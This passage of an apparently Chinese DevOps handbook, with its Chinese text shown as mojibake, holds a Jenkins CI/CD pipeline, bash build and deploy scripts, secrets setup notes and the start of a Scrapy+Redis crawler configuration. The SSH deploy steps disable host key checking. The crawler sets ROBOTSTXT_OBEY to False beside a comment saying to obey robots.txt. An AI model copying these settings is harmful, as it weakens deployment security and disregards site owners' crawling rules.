<span class="s1">                            black --check .</span>
<span class="s1">                        &#39;&#39;&#39;</span>
<span class="w">                    </span><span class="o">}</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">                </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Flake8&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                        </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                            . venv/bin/activate</span>
<span class="s1">                            flake8 . --count --statistics</span>
<span class="s1">                        &#39;&#39;&#39;</span>
<span class="w">                    </span><span class="o">}</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">                </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;MyPy&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                        </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                            . venv/bin/activate</span>
<span class="s1">                            mypy . --ignore-missing-imports</span>
<span class="s1">                        &#39;&#39;&#39;</span>
<span class="w">                    </span><span class="o">}</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Test&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                    . venv/bin/activate</span>
<span class="s1">                    pytest tests/ \</span>
<span class="s1">                        --cov=app \</span>
<span class="s1">                        --cov-report=xml \</span>
<span class="s1">                        --cov-report=html \</span>
<span class="s1">                        --junitxml=junit.xml</span>
<span class="s1">                &#39;&#39;&#39;</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">            </span><span class="n">post</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">always</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">junit</span><span class="w"> </span><span class="s1">&#39;junit.xml&#39;</span>
<span class="w">                    </span><span class="n">publishHTML</span><span class="o">(</span><span class="nl">target:</span><span class="w"> </span><span class="o">[</span>
<span class="w">                        </span><span class="nl">allowMissing:</span><span class="w"> </span><span class="kc">false</span><span class="o">,</span>
<span class="w">                        </span><span class="nl">alwaysLinkToLastBuild:</span><span class="w"> </span><span class="kc">true</span><span class="o">,</span>
<span class="w">                        </span><span class="nl">keepAll:</span><span class="w"> </span><span class="kc">true</span><span class="o">,</span>
<span class="w">                        </span><span class="nl">reportDir:</span><span class="w"> </span><span class="s1">&#39;htmlcov&#39;</span><span class="o">,</span>
<span class="w">                        </span><span class="nl">reportFiles:</span><span class="w"> </span><span class="s1">&#39;index.html&#39;</span><span class="o">,</span>
<span class="w">                        </span><span class="nl">reportName:</span><span class="w"> </span><span class="s1">&#39;Coverage Report&#39;</span>
<span class="w">                    </span><span class="o">])</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Security Scan&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                    . venv/bin/activate</span>
<span class="s1">                    safety check || true</span>
<span class="s1">                    bandit -r app/ -f json -o bandit-report.json || true</span>
<span class="s1">                &#39;&#39;&#39;</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">            </span><span class="n">post</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">always</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">archiveArtifacts</span><span class="w"> </span><span class="nl">artifacts:</span><span class="w"> </span><span class="s1">&#39;bandit-report.json&#39;</span><span class="o">,</span><span class="w"> </span><span class="nl">allowEmptyArchive:</span><span class="w"> </span><span class="kc">true</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Build Docker&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">script</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">docker</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="s2">&quot;${DOCKER_IMAGE}:${GIT_COMMIT_ID}&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;-f docker/Dockerfile .&quot;</span><span class="o">)</span>
<span class="w">                    </span><span class="n">docker</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="s2">&quot;${DOCKER_IMAGE}:latest&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;-f docker/Dockerfile .&quot;</span><span class="o">)</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Push Docker&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">when</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">branch</span><span class="w"> </span><span class="s1">&#39;main&#39;</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">script</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">docker</span><span class="o">.</span><span class="na">withRegistry</span><span class="o">(</span><span class="s1">&#39;&#39;</span><span class="o">,</span><span class="w"> </span><span class="s1">&#39;docker-hub-credentials&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">                        </span><span class="n">docker</span><span class="o">.</span><span class="na">image</span><span class="o">(</span><span class="s2">&quot;${DOCKER_IMAGE}:${GIT_COMMIT_ID}&quot;</span><span class="o">).</span><span class="na">push</span><span class="o">()</span>
<span class="w">                        </span><span class="n">docker</span><span class="o">.</span><span class="na">image</span><span class="o">(</span><span class="s2">&quot;${DOCKER_IMAGE}:latest&quot;</span><span class="o">).</span><span class="na">push</span><span class="o">()</span>
<span class="w">                    </span><span class="o">}</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Deploy to Staging&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">when</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">branch</span><span class="w"> </span><span class="s1">&#39;develop&#39;</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">sshagent</span><span class="o">([</span><span class="s1">&#39;ssh-credentials&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                        ssh -o StrictHostKeyChecking=no user@staging-host &quot;</span>
<span class="s1">                            cd /opt/scraper &amp;&amp;</span>
<span class="s1">                            docker-compose pull &amp;&amp;</span>
<span class="s1">                            docker-compose up -d</span>
<span class="s1">                        &quot;</span>
<span class="s1">                    &#39;&#39;&#39;</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>

<span class="w">        </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Deploy to Production&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">when</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">branch</span><span class="w"> </span><span class="s1">&#39;main&#39;</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
<span class="w">                </span><span class="n">input</span><span class="w"> </span><span class="nl">message:</span><span class="w"> </span><span class="s1">&#39;Deploy to production?&#39;</span><span class="o">,</span><span class="w"> </span><span class="nl">ok:</span><span class="w"> </span><span class="s1">&#39;Deploy&#39;</span>
<span class="w">                </span><span class="n">sshagent</span><span class="o">([</span><span class="s1">&#39;ssh-credentials&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">{</span>
<span class="w">                    </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">                        ssh -o StrictHostKeyChecking=no user@production-host &quot;</span>
<span class="s1">                            cd /opt/scraper &amp;&amp;</span>
<span class="s1">                            docker-compose pull &amp;&amp;</span>
<span class="s1">                            docker-compose up -d &amp;&amp;</span>
<span class="s1">                            docker-compose ps</span>
<span class="s1">                        &quot;</span>
<span class="s1">                    &#39;&#39;&#39;</span>
<span class="w">                </span><span class="o">}</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>
<span class="w">    </span><span class="o">}</span>

<span class="w">    </span><span class="n">post</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="n">always</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">cleanWs</span><span class="o">()</span>
<span class="w">        </span><span class="o">}</span>
<span class="w">        </span><span class="n">success</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">slackSend</span><span class="o">(</span>
<span class="w">                </span><span class="nl">color:</span><span class="w"> </span><span class="s1">&#39;good&#39;</span><span class="o">,</span>
<span class="w">                </span><span class="nl">message:</span><span class="w"> </span><span class="s2">&quot;âœ… Build ${env.JOB_NAME} #${env.BUILD_NUMBER} succeeded&quot;</span>
<span class="w">            </span><span class="o">)</span>
<span class="w">        </span><span class="o">}</span>
<span class="w">        </span><span class="n">failure</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="n">slackSend</span><span class="o">(</span>
<span class="w">                </span><span class="nl">color:</span><span class="w"> </span><span class="s1">&#39;danger&#39;</span><span class="o">,</span>
<span class="w">                </span><span class="nl">message:</span><span class="w"> </span><span class="s2">&quot;âŒ Build ${env.JOB_NAME} #${env.BUILD_NUMBER} failed&quot;</span>
<span class="w">            </span><span class="o">)</span>
<span class="w">        </span><span class="o">}</span>
<span class="w">    </span><span class="o">}</span>
<span class="o">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¾…åŠ©è„šæœ¬">è¾…åŠ©è„šæœ¬</h2>

      <h3 id="scriptsrun_testssh">scripts/run_tests.sh</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nb">set</span><span class="w"> </span>-e

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ğŸ§ª Running tests...&quot;</span>

<span class="c1"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span>
<span class="nb">source</span><span class="w"> </span>venv/bin/activate

<span class="c1"># è¿è¡Œæµ‹è¯•</span>
pytest<span class="w"> </span>tests/<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--cov<span class="o">=</span>app<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--cov-report<span class="o">=</span>xml<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--cov-report<span class="o">=</span>html<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--cov-report<span class="o">=</span>term<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--junitxml<span class="o">=</span>junit.xml<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-v

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;âœ… Tests completed!&quot;</span>
</code></pre>
      </div>

      <h3 id="scriptsbuildsh">scripts/build.sh</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nb">set</span><span class="w"> </span>-e

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ğŸ—ï¸ Building Docker image...&quot;</span>

<span class="c1"># è·å– Git ä¿¡æ¯</span>
<span class="nv">GIT_COMMIT</span><span class="o">=</span><span class="k">$(</span>git<span class="w"> </span>rev-parse<span class="w"> </span>--short<span class="w"> </span>HEAD<span class="k">)</span>
<span class="nv">GIT_BRANCH</span><span class="o">=</span><span class="k">$(</span>git<span class="w"> </span>rev-parse<span class="w"> </span>--abbrev-ref<span class="w"> </span>HEAD<span class="k">)</span>
<span class="nv">BUILD_DATE</span><span class="o">=</span><span class="k">$(</span>date<span class="w"> </span>-u<span class="w"> </span>+<span class="s2">&quot;%Y-%m-%dT%H:%M:%SZ&quot;</span><span class="k">)</span>

<span class="c1"># æ„å»ºé•œåƒ</span>
docker<span class="w"> </span>build<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--build-arg<span class="w"> </span><span class="nv">GIT_COMMIT</span><span class="o">=</span><span class="nv">$GIT_COMMIT</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--build-arg<span class="w"> </span><span class="nv">GIT_BRANCH</span><span class="o">=</span><span class="nv">$GIT_BRANCH</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--build-arg<span class="w"> </span><span class="nv">BUILD_DATE</span><span class="o">=</span><span class="nv">$BUILD_DATE</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-t<span class="w"> </span>scraper:<span class="nv">$GIT_COMMIT</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-t<span class="w"> </span>scraper:latest<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>-f<span class="w"> </span>docker/Dockerfile<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>.

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;âœ… Build completed!&quot;</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Image tags: scraper:</span><span class="nv">$GIT_COMMIT</span><span class="s2">, scraper:latest&quot;</span>
</code></pre>
      </div>

      <h3 id="scriptsdeploysh">scripts/deploy.sh</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nb">set</span><span class="w"> </span>-e

<span class="nv">ENVIRONMENT</span><span class="o">=</span><span class="si">${</span><span class="nv">1</span><span class="k">:-</span><span class="nv">staging</span><span class="si">}</span>

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ğŸš€ Deploying to </span><span class="nv">$ENVIRONMENT</span><span class="s2">...&quot;</span>

<span class="k">case</span><span class="w"> </span><span class="nv">$ENVIRONMENT</span><span class="w"> </span><span class="k">in</span>
<span class="w">  </span>staging<span class="o">)</span>
<span class="w">    </span><span class="nv">HOST</span><span class="o">=</span><span class="nv">$STAGING_HOST</span>
<span class="w">    </span><span class="nv">USER</span><span class="o">=</span><span class="nv">$STAGING_USER</span>
<span class="w">    </span><span class="p">;;</span>
<span class="w">  </span>production<span class="o">)</span>
<span class="w">    </span><span class="nv">HOST</span><span class="o">=</span><span class="nv">$PRODUCTION_HOST</span>
<span class="w">    </span><span class="nv">USER</span><span class="o">=</span><span class="nv">$PRODUCTION_USER</span>
<span class="w">    </span><span class="nb">read</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;âš ï¸  Deploy to PRODUCTION? (yes/no) &quot;</span><span class="w"> </span>-n<span class="w"> </span><span class="m">3</span><span class="w"> </span>-r
<span class="w">    </span><span class="nb">echo</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span><span class="nv">$REPLY</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span>^yes$<span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Deployment cancelled&quot;</span>
<span class="w">        </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="w">    </span><span class="k">fi</span>
<span class="w">    </span><span class="p">;;</span>
<span class="w">  </span>*<span class="o">)</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Unknown environment: </span><span class="nv">$ENVIRONMENT</span><span class="s2">&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="w">    </span><span class="p">;;</span>
<span class="k">esac</span>

<span class="c1"># éƒ¨ç½²</span>
ssh<span class="w"> </span><span class="nv">$USER</span>@<span class="nv">$HOST</span><span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
<span class="s">  cd /opt/scraper</span>
<span class="s">  docker-compose pull</span>
<span class="s">  docker-compose up -d</span>
<span class="s">  docker-compose ps</span>
<span class="s">  echo &quot;âœ… Deployment completed!&quot;</span>
<span class="s">EOF</span>

<span class="c1"># å¥åº·æ£€æŸ¥</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ğŸ¥ Running health check...&quot;</span>
sleep<span class="w"> </span><span class="m">10</span>
<span class="k">if</span><span class="w"> </span>curl<span class="w"> </span>-f<span class="w"> </span>http://<span class="nv">$HOST</span>/health<span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;âœ… Health check passed!&quot;</span>
<span class="k">else</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;âŒ Health check failed!&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="k">fi</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é…ç½®è¯´æ˜">ğŸ“š é…ç½®è¯´æ˜</h2>

      <h3 id="github-secrets-é…ç½®">GitHub Secrets é…ç½®</h3>

      <p>éœ€è¦åœ¨ GitHub ä»“åº“è®¾ç½®ä»¥ä¸‹ Secrets:</p>

      <pre><code>DOCKER_USERNAME       # Docker Hub ç”¨æˆ·å
DOCKER_PASSWORD       # Docker Hub å¯†ç 
SSH_PRIVATE_KEY       # SSH ç§é’¥
SSH_USER              # SSH ç”¨æˆ·å
SSH_HOST              # æœåŠ¡å™¨åœ°å€
SLACK_WEBHOOK         # Slack é€šçŸ¥ Webhook
</code></pre>

      <h3 id="gitlab-cicd-variables">GitLab CI/CD Variables</h3>

      <p>éœ€è¦åœ¨ GitLab é¡¹ç›®è®¾ç½®ä»¥ä¸‹å˜é‡:</p>

      <pre><code>SSH_PRIVATE_KEY       # SSH ç§é’¥
SSH_USER              # SSH ç”¨æˆ·å
STAGING_HOST          # æµ‹è¯•ç¯å¢ƒåœ°å€
PRODUCTION_HOST       # ç”Ÿäº§ç¯å¢ƒåœ°å€
</code></pre>

      <h3 id="jenkins-å‡­æ®">Jenkins å‡­æ®</h3>

      <p>éœ€è¦åœ¨ Jenkins é…ç½®ä»¥ä¸‹å‡­æ®:</p>

      <ul>
        <li><code>docker-hub-credentials</code>: Docker Hub ç”¨æˆ·åå’Œå¯†ç </li>
        <li><code>ssh-credentials</code>: SSH ç§é’¥</li>
      </ul>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">ğŸ“Š æœ€ä½³å®è·µ</h2>

      <ol>
        <li><strong>åˆ†æ”¯ç­–ç•¥</strong>: ä½¿ç”¨ GitFlow æˆ– GitHub Flow</li>
        <li><strong>ä»£ç å®¡æŸ¥</strong>: æ‰€æœ‰ PR å¿…é¡»é€šè¿‡ CI æ£€æŸ¥</li>
        <li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong>: ä¿æŒæµ‹è¯•è¦†ç›–ç‡ &gt; 80%</li>
        <li><strong>å®‰å…¨æ‰«æ</strong>: å®šæœŸæ£€æŸ¥ä¾èµ–æ¼æ´</li>
        <li><strong>ç‰ˆæœ¬ç®¡ç†</strong>: ä½¿ç”¨è¯­ä¹‰åŒ–ç‰ˆæœ¬</li>
        <li><strong>å›æ»šæœºåˆ¶</strong>: ä¿ç•™æœ€è¿‘ 5 ä¸ªç‰ˆæœ¬çš„é•œåƒ</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ğŸ”— ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="#09-Templates-docker-setup">Docker éƒ¨ç½²</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§å‘Šè­¦</a></li>
        <li><a href="https://docs.github.com/actions">GitHub Actions æ–‡æ¡£</a></li>
        <li><a href="https://docs.gitlab.com/ee/ci/">GitLab CI æ–‡æ¡£</a></li>
        <li><a href="https://www.jenkins.io/doc/">Jenkins æ–‡æ¡£</a></li>
      </ul>

    </div>

    <div class="section" id="09-Templates-distributed-crawler">
      <h2>73. Distributed Crawler</h2>
      <h1 id="åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„æ¨¡æ¿">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„æ¨¡æ¿</h1>

      <p>åŸºäº Scrapy + Redis çš„åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„ï¼Œæ”¯æŒå¤šæœºååŒã€ä»»åŠ¡è°ƒåº¦å’Œæ•°æ®å»é‡ã€‚</p>

      <hr />

      <h2 id="é¡¹ç›®ç»“æ„">ğŸ“ é¡¹ç›®ç»“æ„</h2>

      <pre><code>distributed_crawler/
â”œâ”€â”€ scrapy_project/
â”‚   â”œâ”€â”€ scrapy.cfg
â”‚   â”œâ”€â”€ spiders/
â”‚   â”‚   â”œâ”€â”€ __init__.py
â”‚   â”‚   â”œâ”€â”€ base_spider.py
â”‚   â”‚   â””â”€â”€ target_spider.py
â”‚   â”œâ”€â”€ items.py
â”‚   â”œâ”€â”€ pipelines.py
â”‚   â”œâ”€â”€ middlewares.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â””â”€â”€ utils/
â”‚       â”œâ”€â”€ __init__.py
â”‚       â”œâ”€â”€ redis_client.py
â”‚       â””â”€â”€ bloomfilter.py
â”œâ”€â”€ scheduler/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ task_manager.py
â”‚   â””â”€â”€ url_scheduler.py
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â””â”€â”€ redis_config.py
â”œâ”€â”€ docker/
â”‚   â”œâ”€â”€ Dockerfile.spider
â”‚   â”œâ”€â”€ Dockerfile.scheduler
â”‚   â””â”€â”€ docker-compose.yml
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ start_spider.sh
â”‚   â”œâ”€â”€ add_tasks.py
â”‚   â””â”€â”€ monitor.py
â”œâ”€â”€ tests/
â”‚   â””â”€â”€ test_spider.py
â”œâ”€â”€ requirements.txt
â””â”€â”€ README.md
</code></pre>

      <hr />

      <h2 id="æ ¸å¿ƒæ–‡ä»¶">ğŸ“„ æ ¸å¿ƒæ–‡ä»¶</h2>

      <h3 id="1-scrapy_projectsettingspy">1. scrapy_project/settings.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Scrapy åˆ†å¸ƒå¼é…ç½®</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">dotenv</span><span class="w"> </span><span class="kn">import</span> <span class="n">load_dotenv</span>

<span class="n">load_dotenv</span><span class="p">()</span>

<span class="c1"># Scrapy åŸºç¡€é…ç½®</span>
<span class="n">BOT_NAME</span> <span class="o">=</span> <span class="s1">&#39;distributed_crawler&#39;</span>
<span class="n">SPIDER_MODULES</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;scrapy_project.spiders&#39;</span><span class="p">]</span>
<span class="n">NEWSPIDER_MODULE</span> <span class="o">=</span> <span class="s1">&#39;scrapy_project.spiders&#39;</span>

<span class="c1"># éµå®ˆ robots.txt</span>
<span class="n">ROBOTSTXT_OBEY</span> <span class="o">=</span> <span class="kc">False</span>

<span class="c1"># å¹¶å‘é…ç½®</span>
<span class="n">CONCURRENT_REQUESTS</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">CONCURRENT_REQUESTS_PER_DOMAIN</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">CONCURRENT_REQUESTS_PER_IP</span> <span class="o">=</span> <span class="mi">8</span>

<span class="c1"># ä¸‹è½½å»¶è¿Ÿ</span>
<span class="n">DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">RANDOMIZE_DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="kc">True</span>

<span class="c1"># è¶…æ—¶è®¾ç½®</span>
<span class="n">DOWNLOAD_TIMEOUT</span> <span class="o">=</span> <span class="mi">30</span>
<span class="n">RETRY_TIMES</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">RETRY_HTTP_CODES</span> <span class="o">=</span> <span class="p">[</span><span class="mi">500</span><span class="p">,</span> <span class="mi">502</span><span class="p">,</span> <span class="mi">503</span><span class="p">,</span> <span class="mi">504</span><span class="p">,</span> <span class="mi">408</span><span class="p">,</span> <span class="mi">429</span><span class="p">]</span>

<span class="c1"># User-Agent</span>
<span class="n">USER_AGENT</span> <span class="o">=</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span>

<span class="c1"># è¯·æ±‚å¤´</span>
<span class="n">DEFAULT_REQUEST_HEADERS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9,en;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># ==================== Redis é…ç½® ====================</span>

<span class="c1"># ä½¿ç”¨ scrapy-redis</span>
<span class="n">SCHEDULER</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis.scheduler.Scheduler&quot;</span>
<span class="n">DUPEFILTER_CLASS</span> <span class="o">=</span> <span class="s2">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span>
<span class="n">SCHEDULER_PERSIST</span> <span class="o">=</span> <span class="kc">True</span>  <span class="c1"># ä¿æŒè°ƒåº¦é˜Ÿåˆ—</span>

<span class="c1"># Redis è¿æ¥</span>
<span class="n">REDIS_HOST</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">)</span>
<span class="n">REDIS_PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_PORT&#39;</span><span class="p">,</span> <span class="mi">6379</span><span class="p">))</span>
<span class="n">REDIS_PASSWORD</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="n">REDIS_DB</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_DB&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>

<span class="c1"># Redis è¿æ¥é…ç½®</span>
<span class="n">REDIS_PARAMS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">REDIS_PASSWORD</span><span class="p">,</span>
    <span class="s1">&#39;db&#39;</span><span class="p">:</span> <span class="n">REDIS_DB</span><span class="p">,</span>
    <span class="s1">&#39;decode_responses&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>  <span class="c1"># å…³é”®ï¼šä¸è‡ªåŠ¨è§£ç </span>
<span class="p">}</span>

<span class="c1"># è°ƒåº¦é˜Ÿåˆ— key å‰ç¼€</span>
<span class="n">SCHEDULER_QUEUE_KEY</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(spider)s</span><span class="s1">:requests&#39;</span>
<span class="n">SCHEDULER_DUPEFILTER_KEY</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(spider)s</span><span class="s1">:dupefilter&#39;</span>

<span class="c1"># ==================== ä¸­é—´ä»¶ ====================</span>

<span class="n">DOWNLOADER_MIDDLEWARES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1"># é‡è¯•ä¸­é—´ä»¶</span>
    <span class="s1">&#39;scrapy.downloadermiddlewares.retry.RetryMiddleware&#39;</span><span class="p">:</span> <span class="mi">90</span><span class="p">,</span>

    <span class="c1"># Redis ç»Ÿè®¡ä¸­é—´ä»¶</span>
    <span class="s1">&#39;scrapy_redis.downloadermiddleware.RedisStatsMiddleware&#39;</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>

    <span class="c1"># éšæœº User-Agent</span>
